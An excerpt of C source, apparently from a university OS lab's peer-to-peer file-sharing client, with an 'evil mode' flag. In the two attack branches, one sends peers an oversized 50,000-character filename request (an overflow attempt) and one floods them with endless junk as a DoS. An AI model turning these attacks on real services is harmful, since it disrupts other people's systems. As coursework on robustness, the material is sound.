...
static void task_download(task_t *t, task_t *tracker_task)
{
	...
	if (evil_mode == 3)
	{
		int evil_name_size = 50000;
		char evil_name[evil_name_size];
		int evil_i;
		for (evil_i = 0; evil_i < evil_name_size; evil_i++)
			evil_name[evil_i] = 'x';
		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evil_name);
	}
...
static void task_upload(task_t *t)
{
	...
	// WHEN THOU ART EVIL AND A PEER DOTH ASKETH YOU FOR A FILE, SEND 'EM BEEZEES INFINITE JUNK!! - DoS (DESIGN LAB EXTRA CREDIT)
	if (evil_mode == 1)
	{
		while (1)
		{
			osp2p_writef(t->peer_fd, "smellyfish");
		}
	}
...
"         -b[MODE]     Evil mode!!!!!!!!\n");
	...
	// Common process_id - can do uploads and downloads in parallel
	pid_t process_id;
	...
	{	
		if((t = start_download(tracker_task, argv[1])))
		{
			...
			{
				error("process forking for download failed\n");
				return -1;
			}
		}
		task_free(t);
	...
	while ((t = task_listen(listen_task)))
	{
		...
		{
			error("process forking for upload failed\n");
			return -1;
		}
		task_free(t);
	}
